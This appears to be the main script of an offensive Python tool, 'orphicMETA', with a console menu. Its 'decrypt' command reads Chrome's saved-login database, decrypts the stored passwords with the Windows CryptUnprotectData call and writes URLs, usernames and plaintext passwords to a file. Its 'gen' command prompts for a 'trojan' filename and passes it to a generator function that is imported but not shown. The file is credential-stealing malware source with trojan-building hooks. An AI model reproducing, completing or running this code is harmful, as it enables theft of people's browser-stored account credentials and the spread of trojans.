from tqdm import tqdm
import win32crypt
import sqlite3
from core.gen import *
from core.misc import *

def main():

    def decryptFile(file):
        conn = sqlite3.connect(file) 
        cursor = conn.cursor()
        cursor.execute('Select action_url, username_value, password_value FROM logins')
        passfile = open(file+"_decrypt.txt")
        passfile.write("\nChrome Saved Passwords..\n")
        for result in tqdm(cursor.fetchall(), "DECRYPTION"):
            password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
            if password:
                passfile.write('\n[URL]: '+result[0])
                passfile.write('\n[USERNAME]: '+result[1])
                passfile.write('\n[PASSWORD]: ' + str(password))

    def Console():
        clear()
        opshell = Style.BRIGHT + Fore.LIGHTMAGENTA_EX + "orphicMETA>" + Style.RESET_ALL
        main = input(opshell)

        if(main == "help"):
            print("Fancy help message coming soon...")
            input("")
        elif(main == "decrypt"):
            filename = input(tag_blue + " Enter Filename : ")
            try:
                lfile = open(filename, "r")
                decryptFile(filename)
                lfile.close()
                input("")
            except FileNotFoundError:
                print(opshell +" File not Found!")
                input()
        elif(main == "gen"):
            trojan = input("[+] Enter Filename : ")
            generate_file(trojan)
            input("==> press enter..")
    while(True):
        try:
            Console()
        except KeyboardInterrupt:
            exit(1)


if __name__ == "__main__":
    main()